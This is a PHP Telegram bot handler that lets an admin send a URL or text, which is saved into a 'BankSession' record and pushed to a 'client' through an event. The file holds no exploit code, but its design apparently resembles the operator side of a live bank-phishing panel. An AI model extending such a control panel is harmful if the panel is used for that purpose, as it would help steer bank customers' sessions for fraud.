<?php

namespace App\Telegram\Handlers;

use App\Enums\ActionType;
use App\Events\BankSessionUpdated;
use App\Models\Admin;
use App\Models\BankSession;
use SergiX44\Nutgram\Nutgram;

class MessageHandler
{
    public function handle(Nutgram $bot, string $text = ''): void
    {
        /** @var Admin|null $admin */
        $admin = $bot->get('admin');
        if ($admin === null || !$admin->hasPendingAction()) {
            return;
        }
        $pending = $admin->pending_action;
        $type = ActionType::tryFrom($pending['actionType'] ?? '');
        $session = BankSession::find($pending['sessionId'] ?? '');
        if ($type === null || $session === null) {
            $admin->clearPendingAction();
            $bot->sendMessage('Pending action was invalid; cleared.');
            return;
        }

        $command = ['type' => $type->value];
        if ($type->requiresUrl()) {
            $command['url'] = trim($text);
        } else {
            $command['text'] = $text;
        }
        $session->action_type = $command;
        $session->last_activity_at = now();
        $session->save();

        $admin->clearPendingAction();
        BankSessionUpdated::dispatch($session);
        $bot->sendMessage('✓ Sent to client.');
    }
}
